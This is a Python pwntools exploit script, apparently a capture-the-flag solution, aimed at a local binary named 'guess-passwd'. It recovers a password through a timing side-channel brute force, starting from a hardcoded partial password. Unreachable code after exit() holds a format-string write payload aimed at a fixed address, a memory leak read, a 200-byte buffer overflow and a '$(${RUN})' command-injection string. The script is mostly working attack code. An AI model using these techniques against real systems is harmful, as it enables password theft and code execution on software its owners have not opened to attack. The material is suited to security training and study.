#!/usr/bin/env python

from pwn import *
import os
import time

list_a = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
i = 0
max_diff = 0
char = 'a'
p = process("./guess-passwd")
buf = "sW33tC4ndYiSf0rcAN"

while len(buf) < 19:
    i = 0
    while i < len(list_a):
    #t1 = time.time()
        buf_temp = buf
        p = process ("./guess-passwd")
        p.recv()
        buf_temp += list_a[i]
    #t1 = time.time()
        p.sendline(buf_temp)
        t1 = time.time()
        data = p.recv()
        t2 = time.time()
        time_diff = t2-t1
        if time_diff > max_diff:
            max_diff = time_diff
            char = list_a[i]

#    print(time_diff)
        i+=1
    buf += char
    print(buf)
    p.recv()
    p.interactive()
#print (max_diff)
#print (char)

exit()



addr = 0x601060

print(hex(addr))

buf = "%512%16$nBBBBBB" + p64(addr)

p.sendline(buf)

data = p.recv()
print(repr(data))

addr_temp = data[35:43]
print (repr(addr_temp))


buf = "A" *200

p.sendline(buf)
print(p.recv())

exit()


print (p.recv())
p.sendline('$(${RUN})')
print (p.recv())
